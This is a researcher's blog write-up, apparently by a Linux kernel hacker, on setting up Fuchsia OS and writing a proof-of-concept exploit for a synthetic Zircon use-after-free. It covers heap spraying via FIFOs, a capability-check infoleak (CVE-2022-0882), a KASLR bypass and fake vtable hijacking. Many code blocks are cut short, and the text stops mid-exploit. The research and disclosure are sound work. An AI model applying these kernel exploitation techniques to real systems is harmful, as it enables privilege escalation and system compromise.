    <p><a href="https://fuchsia.dev/">Fuchsia</a> is a general-purpose open-source operating system created by Google. It is based on the <a href="https://fuchsia.dev/fuchsia-src/concepts/kernel">Zircon microkernel</a> written in C++ and is currently under active development. The developers say that Fuchsia is <a href="https://opensource.googleblog.com/2020/12/expanding-fuchsias-open-source-model.html?m=1">designed</a> with a focus on security, updatability, and performance. As a Linux kernel hacker, I decided to take a look at Fuchsia OS and assess it from the attacker&#39;s point of view. This article describes my experiments.</p>



<ul>
  <li>In the beginning of the article, I will give an overview of the Fuchsia operating system and its security architecture.</li>

<p><a href="https://fuchsia.dev/">Fuchsia</a> is a general-purpose open-source operating system. Google started the development of this OS <a href="https://9to5google.com/2016/08/14/google-is-working-on-fuchsia-a-new-operating-system-that-isnt-based-on-linux/">around 2016</a>. In December 2020 this project <a href="https://opensource.googleblog.com/2020/12/expanding-fuchsias-open-source-model.html?m=1">was opened</a> for contributors from the public. In May 2021 Google <a href="https://9to5google.com/2021/05/25/google-releases-fuchsia-os-nest-hub/">officially released</a> Fuchsia running on Nest Hub devices. The OS supports <code>arm64</code> and <code>x86-64</code>. Fuchsia is under active development and looks alive, so I decided to do some security experiments on it.</p>

<center><img src="https://a13xp0p0v.github.io/img/fuchsia_logo.png" width="60%"/></center>


<p>Let&#39;s look at the <a href="https://fuchsia.dev/fuchsia-src/concepts">main concepts</a> behind the Fuchsia design. This OS is developed for the <a href="https://9to5google.com/2019/05/09/what-is-google-fuchsia/">ecosystem of connected devices</a>: IoT, smartphones, PCs. That&#39;s why Fuchsia developers pay special attention to security and updatability. As a result, Fuchsia OS has unusual security architecture.</p>

<ul>
  <li>
    <p>First of all, Fuchsia has no concept of a user. Instead, it is <strong>capability-based</strong>. The kernel resources are exposed to applications as objects that require the corresponding capabilities. The main idea is that an application can&#39;t interact with an object if it doesn&#39;t have an explicitly granted capability. Moreover, software running on Fuchsia should receive the least capabilities to perform its job. So, I think, the concept of local privilege escalation (LPE) in Fuchsia would be different from that in GNU/Linux systems, where an attacker executes code as an unprivileged user and exploits some vulnerability to gain root privileges.</p>
  </li>
  <li>
    <p>The second interesting aspect: Fuchsia is based on a <strong>microkernel</strong>. That has great influence on the security properties of this OS. Compared to the Linux kernel, plenty of functionality is moved out from the Zircon microkernel to userspace. That makes the kernel attack surface smaller. See the scheme from the Fuchsia documentation below, which shows that Zircon implements only a few services unlike monolithic OS kernels. However, Zircon does not strive for minimality: it has over 170 syscalls, vastly more than a typical microkernel does. <img src="https://a13xp0p0v.github.io/img/zircon-kernel-services.png" alt="Microkernel architecture"/></p>
  </li>
  <li>
    <p>The next security solution I have to mention is <strong>sandboxing</strong>. Applications and system services live in Fuchsia as separate software units called components. These components run in isolated sandboxes. All inter-process communication (IPC) between them must be explicitly declared. Fuchsia even has no global file system. Instead, each component is given its own local namespace to operate. This design solution increases userspace isolation and security of Fuchsia applications. I think it also makes the Zircon kernel very attractive for an attacker, since Zircon provides system calls for all Fuchsia components.</p>
  </li>
  <li>
    <p>Finally, Fuchsia has an unusual scheme of software delivery and updating. Fuchsia components are identified by URLs and can be <strong>resolved, downloaded, and executed on demand</strong>. The main goal of this design solution is to make software packages in Fuchsia always up to date, like web pages. </p><center><img src="https://a13xp0p0v.github.io/img/component-lifecycle.png" width="70%"/></center></li>
</ul>

  <p>These security features made Fuchsia OS a new and interesting research target for me.</p>

<p>The Fuchsia documentation provides a <a href="https://fuchsia.dev/fuchsia-src/get-started">good tutorial</a> describing how to get started with this OS. The tutorial gives a link to a script that can check your GNU/Linux system against the requirements for building Fuchsia from source:</p>

<div><div><pre><code><span>$ </span>./ffx-linux-x64 platform preflight
</code></pre></div></div>

<p>It says that non-Debian distributions are not supported. However, I haven&#39;t experienced any problems specific for Fedora 34.</p>

<p>The tutorial also provides instructions for downloading the Fuchsia source code and setting up the environment variables.</p>

<p>These commands build Fuchsia&#39;s <code>workstation product</code> with developer tools for <code>x86_64</code>:</p>

<div><div><pre><code><span>$ </span>fx clean
<span>$ </span>fx <span>set </span>workstation.x64 <span>--with-base</span> //bundles:tools
<span>$ </span>fx build
</code></pre></div></div>

<p>After building Fuchsia OS, you can start it in <a href="https://fuchsia.dev/fuchsia-src/development/build/emulator">FEMU</a> (Fuchsia emulator). FEMU is based on the Android Emulator (AEMU), which is a fork of QEMU.</p>



<p><a href="https://a13xp0p0v.github.io/img/fuchsia_screenshot_1.png"><img src="https://a13xp0p0v.github.io/img/fuchsia_screenshot_1.png" alt="Fuchsia emulator screenshot"/></a> </p>



<p>Let&#39;s create a &#34;hello world&#34; application for Fuchsia. As I mentioned earlier, Fuchsia applications and programs are called components. This command creates a template for a new component:</p>

<div><div><pre><code><span>$ </span>fx create component <span>--path</span> src/a13x-pwns-fuchsia <span>--lang</span> cpp
</code></pre></div></div>

<p>I want this component to print &#34;hello&#34; to the Fuchsia log:</p>

<div><div><pre><code><span>#include &lt;iostream&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span><span>**</span> <span>argv</span><span>)</span>
<span>{</span>
  <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>&#34;Hello from a13x, Fuchsia!</span><span>\n</span><span>&#34;</span><span>;</span>
  <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The component manifest <code>src/a13x-pwns-fuchsia/meta/a13x_pwns_fuchsia.cml</code> should have this part to allow stdout logging:</p>

<div><div><pre><code><span>program:</span> <span>{</span>
    <span>// Use the built-in ELF runner.</span>
    <span>runner:</span> <span>&#34;elf&#34;</span><span>,</span>

    <span>// The binary to run for this component.</span>
    <span>binary:</span> <span>&#34;bin/a13x-pwns-fuchsia&#34;</span><span>,</span>

    <span>// Enable stdout logging</span>
    <span>forward_stderr_to:</span> <span>&#34;log&#34;</span><span>,</span>
    <span>forward_stdout_to:</span> <span>&#34;log&#34;</span><span>,</span>
<span>},</span>
</code></pre></div></div>

<p>These commands build Fuchsia with a new component:</p>

<div><div><pre><code><span>$ </span>fx <span>set </span>workstation.x64 <span>--with-base</span> //bundles:tools <span>--with-base</span> //src/a13x-pwns-fuchsia
<span>$ </span>fx build
</code></pre></div></div>

<p>When Fuchsia with the new component is built, we can test it:</p>
<ol>
  <li>Start FEMU with Fuchsia using the command <code>fx vdl start -N</code> in the first terminal on the host system</li>
  <li>Start Fuchsia package publishing server using the command <code>fx serve</code> in the second terminal on the host system</li>
  <li>Show Fuchsia logs using the command <code>fx log</code> in the third terminal on the host system</li>
  <li>Start the new component using the <code>ffx</code> tool in the fourth terminal on the host system:
    <div><div><pre><code> <span>$ </span>ffx component run fuchsia-pkg://fuchsia.com/a13x-pwns-fuchsia#meta/a13x_pwns_fuchsia.cm <span>--recreate</span>
</code></pre></div>    </div>
  </li>
</ol>

<p><a href="https://a13xp0p0v.github.io/img/fuchsia_screenshot_2.png"><img src="https://a13xp0p0v.github.io/img/fuchsia_screenshot_2.png" alt="Fuchsia component screenshot"/></a></p>

<p>In this screenshot (click to zoom in) we see that Fuchsia resolved the component by URL, downloaded and started it. Then the component printed <code>Hello from a13x, Fuchsia!</code> to the Fuchsia log in the third terminal.</p>



<p>Now let&#39;s focus on the Zircon kernel development workflow. The Zircon source code in C++ is a part of the Fuchsia source code. Residing in the <code>zircon/kernel</code> subdirectory, it is compiled when Fuchsia OS is built. Zircon development and debugging requires running it in QEMU using the <code>fx qemu -N</code> command. However, when I tried it I got an error:</p>

<div><div><pre><code><span>$ </span>fx qemu <span>-N</span>

ninja: no work to do.
ERROR: Could not extend FVM, unable to stat FVM image out/default/obj/build/images/fuchsia/fuchsia/fvm.blk
</span></code></pre></div></div>

<p>I discovered that this fault happens on machines that have a non-English console locale. This <a href="https://github.com/assusdan/fuchsia-patches">bug has been known</a> for a long time. I have no idea why the fix hasn&#39;t been merged yet. With this patch Fuchsia OS successfully starts on a QEMU/KVM virtual machine:</p>

<p>Running Fuchsia in QEMU/KVM enables debugging of the Zircon microkernel with GDB. Let&#39;s see that in action.</p>

<ol>
  <li>Start Fuchsia with this command:
    <div><div><pre><code><span>$ </span>fx qemu <span>-N</span> <span>-s</span> 1 <span>--no-kvm</span> <span>--</span> <span>-s</span>
</code></pre></div>    </div>
    <ul>
      <li>The <code>-s 1</code> argument specifies the number of virtual CPUs for this virtual machine. Having a single virtual CPU makes the debugging experience better.</li>
      <li>The <code>--no-kvm</code> argument is useful if you need single-stepping during the debugging session. Otherwise KVM interrupts break the workflow and Fuchsia gets into the interrupt handler after each <code>stepi</code> or <code>nexti</code> GDB command. However, running Fuchsia VM without KVM virtualization support is much slower.</li>
      <li>The <code>-s</code> argument at the end of the command opens a gdbserver on TCP port 1234.</li>
    </ul>
  </li>
  <li>Allow execution of the Zircon GDB script, which provides several things:
    <ul>
      <li>KASLR relocation for GDB, which is needed for setting breakpoints correctly.</li>
      <li>Special GDB commands with a <code>zircon</code> prefix.</li>
      <li>Pretty-printers for Zircon objects (none at the moment, alas).</li>
      <li>Enhanced unwinder for Zircon kernel faults.
        <div><div><pre><code><span>$ </span><span>cat</span> ~/.gdbinit

</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Start the GDB client and attach to the GDB server of Fuchsia VM:
    <div><div><pre><code><span>$ </span><span>cd</span> /home/a13x/develop/fuchsia/src/fuchsia/out/default/

<span>(</span>gdb<span>)</span> target extended-remote :1234
</code></pre></div>    </div>
  </li>
</ol>

<p>This procedure is for debugging Zircon with GDB.</p>

<p>On my machine, however, the Zircon GDB script completely hanged on each start and I had to debug this script. I found out that it calls the <code>add-symbol-file</code> GDB command with the <code>-readnow</code> parameter, which requires reading the entire symbol file immediately. For some reason, GDB was unable to chew symbols from the 110MB Zircon binary within a reasonable time. Removing this option fixed the bug on my machine and allowed normal Zircon debugging (click on the GDB screenshot to zoom in):</p>

<p><a href="https://google.github.io/kernel-sanitizers/">KASAN</a> (Kernel Address SANitizer) is a runtime memory debugger designed to find out-of-bounds accesses and use-after-free bugs. Fuchsia supports compiling the Zircon microkernel with KASAN. For this experiment I built the Fuchsia <code>core product</code>:</p>

<div><div><pre><code><span>$ </span>fx <span>set </span>core.x64 <span>--with-base</span> //bundles:tools <span>--with-base</span> //src/a13x-pwns-fuchsia <span>--variant</span><span>=</span>kasan
<span>$ </span>fx build
</code></pre></div></div>

<p>For testing KASAN I added a synthetic bug to the Fuchsia code working with the <code>TimerDispatcher</code> object:</p>

<div><div><pre><code><span>diff --git a/zircon/kernel/object/timer_dispatcher.cc b/zircon/kernel/object/timer_dispatcher.cc

<p>As you can see, if the timer deadline value ends with <code>31337</code>, then the <code>TimerDispatcher</code> object is freed regardless of the refcount value. I wanted to hit this kernel bug from the userspace component to see the KASAN error report. That is the code I added to my <code>a13x-pwns-fuchsia</code> component:</p>

<div><div><pre><code>  <span>zx_status_t</span> <span>status</span><span>;</span>

</code></pre></div></div>

<p>Here the <code>zx_timer_create()</code> syscall is called. It initializes the timer handle of a new timer object. Then this program sets the timer deadline to the magic value that ends with <code>31337</code>. While this program waits on <code>zx_nanosleep()</code>, Zircon deletes the fired timer. The following <code>zx_timer_cancel()</code> syscall for the deleted timer provokes use-after-free.</p>

<p>So executing this userspace component crashed the Zircon kernel and delivered a lovely KASAN report. Nice, KASAN works! Quoting the relevant parts:</p>

<p>Zircon also prints the crash backtrace as a chain of some obscure kernel addresses. To make it human-readable, I had to process it with a special Fuchsia tool:</p>

<p>You can see that the <code>wrapper_timer_cancel()</code> syscall handler calls <code>sys_timer_cancel()</code>, where <code>GetDispatcherWithRightsImpl&lt;TimerDispatcher&gt;()</code> works with a reference counter and performs use-after-free.

  <p>When I got Fuchsia OS working with KASAN, I felt confident and ready for the security research.</p>
</blockquote>



<p>After studying the basics of the Fuchsia kernel development workflow, I decided to start the security research. For experiments with Fuchsia kernel security, I needed a Zircon bug for developing a PoC exploit. The simplest way to achieve that was fuzzing.</p>

<p>There is a great coverage-guided kernel fuzzer called <a href="https://github.com/google/syzkaller">syzkaller</a>. I&#39;m fond of this project and its team, and I like to use it for fuzzing the Linux kernel. The syzkaller documentation says that <a href="https://github.com/google/syzkaller/blob/master/docs/fuchsia/README.md">it supports</a> fuzzing Fuchsia, so I tried it in the first place.</p>

<p>However, I ran into trouble due to the unusual software delivery on Fuchsia, which I described earlier. A Fuchsia image for fuzzing must contain <code>syz-executor</code> as a component. <code>syz-executor</code> is a part of the syzkaller project that is responsible for executing the fuzzing input on a virtual machine. But I didn&#39;t manage to build a Fuchsia image with this component.</p>

<p>First, I tried building Fuchsia with external syzkaller source code, according to the <a href="https://github.com/google/syzkaller/blob/master/docs/fuchsia/README.md">syzkaller documentation</a>:</p>

<div><div><pre><code>$ fx --dir &#34;out/x64&#34; set core.x64 \
  --with-base &#34;//bundles:tools&#34; \
  --with-base &#34;//src/testing/fuzzing/syzkaller&#34; \
  --args=syzkaller_dir=&#39;&#34;/home/a13x/develop/gopath/src/github.com/google/syzkaller/&#34;&#39;
ERROR at //build/go/go_library.gni:43:3 (//build/toolchain:host_x64): Assertion failed.
   assert(defined(invoker.sources), &#34;sources is required for go_library&#34;)
   ^-----

     &#34;:run-sysgen($host_toolchain)&#34;,
     ^-----------------------------
ERROR: error running gn gen: exit status 1
</code></pre></div></div>

<p>It looks like the build system doesn&#39;t handle the <code>syzkaller_dir</code> argument properly. I tried to remove this assertion and debug the Fuchsia build system, but I failed.</p>

<p>Then I found the <code>third_party/syzkaller/</code> subdirectory in the Fuchsia source code. It contains a local copy of syzkaller sources that is used for building without <code>--args=syzkaller_dir</code>. But it&#39;s quite an old copy: the last commit is from June 2, 2020. Building the current Fuchsia with this old version of syzkaller failed as well because of a number of changes in Fuchsia syscalls, header file locations, and so on.</p>

<p>I tried one more time and updated syzkaller in the <code>third_party/syzkaller/</code> subdirectory. But building didn&#39;t work because the Fuchsia <a href="https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/src/testing/fuzzing/syzkaller/BUILD.gn"><code>BUILD.gn</code> file for syzkaller</a> needed a substantial rewriting according to the syzkaller changes.</p>

<p>In short, Fuchsia was integrated with the syzkaller kernel fuzzer once in 2020, but currently this integration is broken. I looked at the Fuchsia version control system to find Fuchsia developers who committed to this functionality. I wrote them an email describing all technical details of this bug, but didn&#39;t get a reply.</p>

<p>Spending more time on the Fuchsia build system was stressing me out.</p>



<p>I reflected on my strategy of the further research.</p>

<center><img src="https://a13xp0p0v.github.io/img/Vityaz.jpg" width="90%"/></center>


<p>Without fuzzing, successful vulnerability discovery in an OS kernel requires:</p>
<ol>
  <li>Good knowledge of its codebase</li>
  <li>Deep understanding of its attack surface</li>
</ol>

<p>Getting this experience with Fuchsia would require a lot of my time. Did I want to spend a lot of time on my first Fuchsia research? Perhaps not, because:</p>
<ul>
  <li>Committing large resources to the first familiarity with the system is not reasonable</li>
  <li>Fuchsia turned out to be less production-ready than I expected</li>
</ul>

<p>So I decided to postpone searching for zero-day vulnerabilities in Zircon and try to develop a PoC exploit for the synthetic bug that I had used for testing KASAN. Ultimately, that was a good decision because it gave me quick results and allowed to find other Zircon vulnerabilities along the way.</p>



<p>So I focused on exploiting use-after-free for <code>TimerDispatcher</code>. My exploitation strategy was simple: overwrite the freed <code>TimerDispatcher</code> object with the controlled data that would make the Zircon timer code work abnormally or, in other words, would turn this code into a <a href="https://addxorrol.blogspot.com/2018/10/turing-completeness-weird-machines.html">weird machine</a>.</p>

<center><img src="https://a13xp0p0v.github.io/img/uaf.png" width="70%"/></center>


<p>First of all, for overwriting <code>TimerDispatcher</code>, I needed to discover a heap spraying exploit primitive that:</p>
<ol>
  <li>Can be used by the attacker from the unprivileged userspace component</li>
  <li>Makes Zircon allocate a new kernel object at the location of the freed object</li>
  <li>Makes Zircon copy the attacker&#39;s data from the userspace to this new kernel object</li>
</ol>

<p>I knew from my Linux kernel experience that heap spraying is usually constructed using inter-process communication (IPC). Basic IPC syscalls are usually available for unprivileged programs, according to paragraph 1. They copy userspace data to the kernelspace to transfer it to the recipient, according to paragraph 3. And finally, some IPC syscalls set the data size for the transfer, which gives control over the kernel allocator behavior and allows the attacker to overwrite the target freed object, according to paragraph 2.</p>

<p>That&#39;s why I started to study the <a href="https://fuchsia.dev/fuchsia-src/reference/syscalls">Zircon syscalls</a> responsible for IPC. I found <a href="https://fuchsia.dev/fuchsia-src/reference/syscalls/fifo_create">Zircon FIFO</a>, which turned out to be an excellent heap spraying primitive. When the <code>zx_fifo_create()</code> syscall is called, Zircon creates a pair of <code>FifoDispatcher</code> objects (see the code in <a href="https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/zircon/kernel/object/fifo_dispatcher.cc">zircon/kernel/object/fifo_dispatcher.cc</a>). Each of them allocates the required amount of kernel memory for the FIFO data:</p>

<div><div><pre><code>  <span>auto</span> <span>data0</span> <span>=</span> <span>ktl</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>uint8_t</span><span>[]</span><span>&gt;</span><span>(</span><span>new</span> <span>(</span><span>&amp;</span><span>ac</span><span>)</span> <span>uint8_t</span><span>[</span><span>count</span> <span>*</span> <span>elemsize</span><span>]);</span>

    <span>return</span> <span>ZX_ERR_NO_MEMORY</span><span>;</span>

    <span>return</span> <span>ZX_ERR_NO_MEMORY</span><span>;</span>
</code></pre></div></div>

<p>With the debugger, I determined that the size of the freed <code>TimerDispatcher</code> object is 248 bytes. I assumed that for successful heap spraying I needed to create Zircon FIFOs of the same data size. This idea worked instantly: in GDB I saw that Zircon overwrote the freed <code>TimerDispatcher</code> with <code>FifoDispatcher</code> data! This is the code for the heap spraying in my PoC exploit:</p>

<div><div><pre><code>  <span>printf</span><span>(</span><span>&#34;[!] do heap spraying...</span><span>\n</span><span>&#34;</span><span>);</span>

<span>#define N 10

    <span>if</span> <span>(</span><span>status</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
      <span>printf</span><span>(</span><span>&#34;[-] creating a fifo %d failed</span><span>\n</span><span>&#34;</span><span>,</span> <span>i</span><span>);</span>
      <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
  <span>}</span>
</code></pre></div></div>

<p>Here the <code>zx_fifo_create()</code> syscall is executed 10 times. Each of them creates a pair of FIFOs that contain 31 elements. The size of each element is 8 bytes. So this code creates 20 <code>FifoDispatcher</code> objects with 248-byte data buffers.</p>

<p>And here the Zircon FIFOs are filled with the heap spraying payload that is prepared for overwriting the freed <code>TimerDispatcher</code> object:</p>

<blockquote>
  <p>Ok, I got the ability to change the TimerDispatcher object contents. But what to write into it to mount the attack?</p>
</blockquote>



<p>As a Linux kernel developer, I got used to C structures describing kernel objects. A method of a Linux kernel object is implemented as a function pointer stored in the corresponding C structure. This memory layout is explicit and simple.</p>

<p>But the memory layout of C++ objects in Zircon looked much more complex and obscure to me. I tried to study the anatomy of the <code>TimerDispatcher</code> object and showed it in GDB using the command <code>print -pretty on -vtbl on</code>. The output was a big mess, and I didn&#39;t manage to correlate it with the hexdump of this object. Then I tried the <code>pahole</code> utility for <code>TimerDispatcher</code>. It showed the offsets of the class members, but didn&#39;t help with understanding how class methods are implemented. Class inheritance made the whole picture more complicated.</p>

<p>I decided not to waste my time on studying <code>TimerDispatcher</code> object internals, but try blind practice instead. I used the FIFO heap spraying to overwrite the whole <code>TimerDispatcher</code> with zero bytes and saw what happened. Zircon crashed at the assertion in <code>zircon/system/ulib/fbl/include/fbl/ref_counted_internal.h:57</code>:</p>

<div><div><pre><code>    <span>const</span> <span>int32_t</span> <span>rc</span> <span>=</span> <span>ref_count_</span><span>.</span><span>fetch_add</span><span>(</span><span>1</span><span>,</span> <span>std</span><span>::</span><span>memory_order_relaxed</span><span>);</span>

    <span>}</span>

</code></pre></div></div>

<p>No problem. I found that this refcount is stored at the 8-byte offset from the beginning of the <code>TimerDispatcher</code> object. To bypass this check, I set the corresponding bytes in the heap spraying payload:</p>

<div><div><pre><code>  <span>unsigned</span> <span>int</span> <span>*</span><span>refcount_ptr</span> <span>=</span> <span>(</span><span>unsigned</span> <span>int</span> <span>*</span><span>)</span><span>&amp;</span><span>spray_data</span><span>[</span><span>8</span><span>];</span>

  <span>*</span><span>refcount_ptr</span> <span>=</span> <span>0x1337C0DE</span><span>;</span>
</code></pre></div></div>

<p>Running this PoC on Fuchsia resulted in the next Zircon crash, which was very interesting from the attacker&#39;s point of view. The kernel hit a null pointer dereference in <code>HandleTable::GetDispatcherWithRights&lt;TimerDispatcher&gt;</code>. Stepping through the instructions with GDB helped me to find out that this C++ dark magic causes Zircon to crash:</p>

<div><div><pre><code><span>// Dispatcher -&gt; FooDispatcher</span>

             <span>:</span> <span>nullptr</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here Zircon calls the <code>get_type()</code> public method of the <code>TimerDispatcher</code> class. This method is referenced using a <a href="https://en.wikipedia.org/wiki/Virtual_method_table">C++ vtable</a>. The pointer to the <code>TimerDispatcher</code> vtable is stored at the beginning of each <code>TimerDispatcher</code> object. It is great for control-flow hijacking. I would say it is simpler than similar attacks for the Linux kernel, where you need to search for appropriate kernel structures with function pointers.</p>



<p>Control-flow hijacking requires knowledge of kernel symbol addresses, which depend on the KASLR offset. KASLR stands for kernel address space layout randomization. The Zircon source code mentions KASLR many times. An example from <code>zircon/kernel/params.gni</code>:</p>

<div><div><pre><code>  <span># Virtual address where the kernel is mapped statically.  This is the
</span>  <span># base of addresses that appear in the kernel symbol table.  At runtime
</span>  <span># KASLR relocation processing adjusts addresses in memory from this base

</span>  <span>}</span>
</code></pre></div></div>

<p>For Fuchsia, I decided to implement a trick similar to my KASLR bypass for the Linux kernel. My <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">PoC exploit for CVE-2021-26708</a> used the Linux kernel log for reading kernel pointers to mount the attack. The Fuchsia kernel log contains security-sensitive information as well. So I tried to read the Zircon log from my unprivileged userspace component. I added <code>use: [ { protocol: &#34;fuchsia.boot.ReadOnlyLog&#34; } ]</code> to the component manifest and opened the log with this code:</p>

<p>First, this code creates a Fuchsia channel that will be used for the Fuchsia log protocol. Then it calls <code>fdio_service_connect()</code> for <code>ReadOnlyLog</code> and attaches the channel transport to it. These functions are from the <code>fdio</code> library, which provides a unified interface to a variety of Fuchsia resources: files, sockets, services, and others. Executing this code returns the error:</p>

<div><div><pre><code>[ffx-laboratory:a13x_pwns_fuchsia] WARNING: Failed to route protocol `fuchsia.boot.ReadOnlyLog` with
  target component `/core/ffx-laboratory:a13x_pwns_fuchsia`: A `use from parent` declaration was found
  at `/core/ffx-laboratory:a13x_pwns_fuchsia` for `fuchsia.boot.ReadOnlyLog`, but no matching `offer`
  declaration was found in the parent

</code></pre></div></div>

<p>That is correct behavior. My component is unprivileged and there is no matching <code>offer</code> declaration of <code>fuchsia.boot.ReadOnlyLog</code> in the parent. No access is granted since this Fuchsia component doesn&#39;t have the required capabilities. No way.</p>

<p>So I dropped the idea of an infoleak from the kernel log. I started browsing through the Fuchsia source code and waiting for another insight. Suddenly I found another way to access the Fuchsia kernel log using the <code>zx_debuglog_create()</code> syscall:</p>

<div><div><pre><code><span>zx_status_t</span> <span>zx_debuglog_create</span><span>(</span><span>zx_handle_t</span> <span>resource</span><span>,</span>
                               <span>uint32_t</span> <span>options</span><span>,</span>

</code></pre></div></div>

<p>The Fuchsia <a href="https://fuchsia.dev/fuchsia-src/reference/syscalls/debuglog_create?hl=en">documentation says</a> that the <code>resource</code> argument <strong>must</strong> have the resource kind <code>ZX_RSRC_KIND_ROOT</code>. My Fuchsia component doesn&#39;t own this resource. Anyway, I tried using <code>zx_debuglog_create()</code> and…</p>

<div><div><pre><code><span>zx_handle_t</span> <span>root_resource</span><span>;</span> <span>// global var initialized by 0</span>

<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span><span>**</span> <span>argv</span><span>)</span>
<span>{</span>

  <span>}</span>
</code></pre></div></div>

<p>And this code worked! I managed to read the Zircon kernel log without the required capabilities and without the <code>ZX_RSRC_KIND_ROOT</code> resource. But why? I was amazed and found the Zircon code responsible for handling this syscall. Here&#39;s what I found:</p>

  <span>}</span>
</code></pre></div></div>

<p>A hilarious security check indeed! The Fuchsia bug report system for the issues 32044 and 30918 gave <code>access denied</code>. So I filed a <a href="https://bugs.fuchsia.dev/p/fuchsia/issues/detail?id=94740">security bug</a> describing that <code>sys_debuglog_create()</code> has an improper capability check leading to a kernel infoleak. By the way, this issue tracker asked for the info in plain text, but by default it renders the report in Markdown (that&#39;s weird, click the <code>Markdown</code> button to disable this behavior).</p>

<p>The Fuchsia maintainers approved this issue and requested a <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0882">CVE-2022-0882</a>.</p>



<p>As reading the Fuchsia kernel log was not a problem any more, I extracted some kernel pointers from it to bypass Zircon KASLR. I was amazed for a second time and laughed again.</p>

<blockquote>
  <p>Despite KASLR, the kernel pointers were the same on every Fuchsia boot!</p>

<p>The kernel pointers are the same. Zircon KASLR doesn&#39;t work. I filed a <a href="https://bugs.fuchsia.dev/p/fuchsia/issues/detail?id=94731">security issue</a> in the Fuchsia bug tracker (disable the Markdown mode to see it properly). The Fuchsia maintainers replied that this issue is known to them.</p>

<p>Fuchsia OS turned out to be more experimental than I had expected.</p>



<p>After I realized that Fuchsia kernel functions have constant addresses, I started to study the vtables of Zircon C++ objects. I thought that constructing a fake vtable could enable control-flow hijacking.</p>

<p>As I mentioned, the pointer to the corresponding vtable is stored at the beginning of the object. This is what GDB shows for a <code>TimerDispatcher</code> object:</p>

<div><div><pre><code>(gdb) info vtbl *(TimerDispatcher *)0xffffff802c5ae768
vtable for &#39;TimerDispatcher&#39; @ 0xffffffff003bd11c (subobject @ 0xffffff802c5ae768):
[0]: 0xffdffe64ffdffd24
[1]: 0xffdcb5a4ffe00454
[2]: 0xffdffea4ffdc7824
[3]: 0xffd604c4ffd519f4
...
</code></pre></div></div>

<p>The weird values like <code>0xffdcb5a4ffe00454</code> are definitely not kernel addresses. I looked at the code that works with the <code>TimerDispatcher</code> vtable:</p>

<div><div><pre><code><span>// Dispatcher -&gt; FooDispatcher</span>
<span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
<span>fbl</span><span>::</span><span>RefPtr</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>DownCastDispatcher</span><span>(</span><span>fbl</span><span>::</span><span>RefPtr</span><span>&lt;</span><span>Dispatcher</span><span>&gt;*</span> <span>disp</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>likely</span><span>(</span><span>DispatchTag</span><span>&lt;</span><span>T</span><span>&gt;::</span><span>ID</span> <span>==</span> <span>(</span><span>*</span><span>disp</span><span>)</span><span>-&gt;</span><span>get_type</span><span>()))</span>
             <span>?</span> <span>fbl</span><span>::</span><span>RefPtr</span><span>&lt;</span><span>T</span><span>&gt;::</span><span>Downcast</span><span>(</span><span>ktl</span><span>::</span><span>move</span><span>(</span><span>*</span><span>disp</span><span>))</span>
             <span>:</span> <span>nullptr</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This high-level C++ nightmare turns into the following simple assembly:</p>

<div><div><pre><code>  mov    rax,QWORD PTR [r13+0x0]
  movsxd r11,DWORD PTR [rax+0x8]
  add    r11,rax
  mov    rdi,r13
  call   0xffffffff0031a77c &lt;__x86_indirect_thunk_r11&gt;
</code></pre></div></div>

<p>Here the <code>r13</code> register stores the address of the <code>TimerDispatcher</code> object. The vtable pointer resides at the beginning of the object. So after the first <code>mov</code> instruction, the <code>rax</code> register stores the address of the vtable itself. Then the <code>movsxd</code> instruction moves the value <code>0xffdcb5a4ffe00454</code> from the vtable to the <code>r11</code> register. But <code>movsxd</code> also sign-extends this value from a 32-bit source to a 64-bit destination. So <code>0xffdcb5a4ffe00454</code> turns into <code>0xffffffffffe00454</code>. Then the vtable address is added to this value in <code>r11</code>, which forms the address of the <code>TimerDispatcher</code> method:</p>

<div><div><pre><code>(gdb) x $r11
0xffffffff001bd570 &lt;_ZNK15TimerDispatcher8get_typeEv&gt;:	0x000016b8e5894855
</code></pre></div></div>



<p>Despite this weird pointer arithmetics in Zircon vtables, I decided to craft a fake <code>TimerDispatcher</code> object vtable to hijack the kernel control flow. That led me to the question of where to place my fake vtable. The simplest way is to create it in the userspace. However, Zircon on <code>x86_64</code> supports <code>SMAP</code> (Supervisor Mode Access Prevention), which blocks access to the userspace data from the kernelspace.</p>

<blockquote>
  <p>In my <a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">Linux Kernel Defence Map</a>, you can see SMAP among various mitigations of control-flow hijacking attacks in the Linux kernel.</p>
</blockquote>

<p>I saw multiple ways to bypass <code>SMAP</code> protection by placing the fake vtable in the kernelspace.</p>
<ol>
  <li>For example, Zircon also has <code>physmap</code> like the Linux kernel, which makes the idea of the <code>ret2dir</code> attack for Zircon very promising.</li>
  <li>Another idea was to use a kernel log infoleak of some kernel address that points to the data controlled by the attacker.</li>
</ol>

<p>But to simplify my first security experiment with Fuchsia, I decided to disable <code>SMAP</code> and <code>SMEP</code> in the script starting QEMU and create the fake vtable in my exploit in the userspace:</p>

<div><div><pre><code><span>#define VTABLE_SZ 16
</span><span>unsigned</span> <span>long</span> <span>fake_vtable</span><span>[</span><span>VTABLE_SZ</span><span>]</span> <span>=</span> <span>{</span> <span>0</span> <span>};</span> <span>// global array</span>
</code></pre></div></div>

<p>Then I made the exploit use this fake vtable in the heap spraying data that overwrite the <code>TimerDispatcher</code> object:</p>

<div><div><pre><code><span>#define DATA_SZ 512
</span>  <span>unsigned</span> <span>char</span> <span>spray_data</span><span>[</span><span>DATA_SZ</span><span>]</span> <span>=</span> <span>{</span> <span>0</span> <span>};</span>
